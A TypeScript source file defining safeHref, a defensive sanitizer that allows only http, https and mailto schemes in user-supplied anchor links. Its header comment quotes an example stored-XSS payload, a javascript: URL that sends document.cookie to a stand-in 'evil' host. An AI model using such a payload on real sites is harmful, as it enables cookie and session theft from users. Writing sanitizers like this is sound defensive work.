/**
 * safeHref — sanitize a user-supplied string before using it as an anchor `href`
 * (sec-1, #232).
 *
 * Community links (event registration/recording URLs, resource URLs) are stored
 * verbatim and rendered straight into `<a href>`. React 18 does NOT neutralize
 * `javascript:` URLs in href — that protection only shipped in React 19 — so a
 * stored value like `javascript:fetch('https://evil/?c='+document.cookie)` would
 * execute in the victim's origin on click (and `target="_blank" rel="noopener"`
 * does not stop `javascript:` execution).
 *
 * This returns the URL ONLY when its scheme is in the allowlist below; anything
 * else (including relative/unparseable input) returns `undefined`, so the anchor
 * simply has no href and cannot navigate. Callers use `href={safeHref(url)}`.
 *
 * Note: `undefined`, not `'#'` — a `'#'` fallback would navigate to the top of
 * the page and still be a (harmless but confusing) link.
 */

const ALLOWED_SCHEMES = new Set(['http:', 'https:', 'mailto:']);

export function safeHref(raw: string | null | undefined): string | undefined {
  if (typeof raw !== 'string') return undefined;

  const trimmed = raw.trim();
  if (!trimmed) return undefined;

  // Parse with the URL constructor so scheme detection can't be fooled by
  // casing, tabs/newlines, or exotic encodings. No base is passed, so a relative
  // path (e.g. "/foo" or "example.com/x") throws and is rejected — these links
  // are meant to be absolute external URLs.
  let parsed: URL;
  try {
    parsed = new URL(trimmed);
  } catch {
    return undefined;
  }

  if (!ALLOWED_SCHEMES.has(parsed.protocol)) return undefined;

  // Return the caller's trimmed string (not parsed.href) so a legitimate URL is
  // preserved byte-for-byte rather than reserialized (avoids surprising the user
  // with normalization like an added trailing slash).
  return trimmed;
}
